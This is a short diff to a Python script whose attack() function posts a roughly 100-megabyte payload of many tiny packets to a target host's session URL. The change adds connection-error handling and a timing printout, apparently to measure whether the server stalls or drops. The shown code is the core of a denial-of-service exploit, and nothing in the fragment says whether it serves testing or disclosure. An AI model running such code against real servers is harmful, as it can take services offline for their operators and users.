@@ -66,12 +66,18 @@ def attack(host, payload_length=100000000, make_payload=many_tiny_packets):
     # Fire payload
     payload = make_payload(payload_length)
     print("Firing payload of length", len(payload), repr(payload[:100]))
-    final_response = requests.post(
-        session_url + timestr(),
-        data=payload,
-        headers={'Content-Type': 'text/plain'},
-    ).text
-    print("Server returned", repr(final_response))
+    try:
+        start_time = time.time()
+        final_response = requests.post(
+            session_url + timestr(),
+            data=payload,
+            headers={'Content-Type': 'text/plain'},
+        ).text
+        print("Server returned", repr(final_response))
+    except requests.exceptions.ConnectionError as e:
+        print(e)
+    finally:
+        print("Duration:", int(time.time() - start_time))
 
 
 def x(payload_length=100000000, make_payload=many_tiny_packets):
